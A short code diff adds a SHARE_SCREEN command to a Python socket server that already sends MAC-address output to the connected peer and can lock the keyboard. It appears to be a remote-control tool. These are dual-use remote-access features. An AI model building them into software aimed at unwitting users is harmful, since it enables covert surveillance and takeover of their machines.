@@ -15,6 +15,7 @@ import codecs
 import sys
 import time
 import re
+import stream
 class Server(object):
     def main_form(self):
         """Creates the interface window"""
@@ -69,6 +70,11 @@ class Server(object):
             mac_out = subprocess.check_output(['getmac', '/v','/fo','list'])
             self.conn.sendall(mac_out)
             self.conn.send('STOPRIGHTNOW'.encode())
+        elif Str.decode()=="SHARE_SCREEN":
+            sender=stream.StreamingSender(conn=self.conn,addr=self.target_addr)
+            sender_thread=threading.Thread(target=sender.start_stream)
+            sender_thread.start()
+            pass
         elif Str.decode().find('LOCKKEYBOARD') != -1:
             tmp = Str.decode().split(' ')
             for i in range(180):
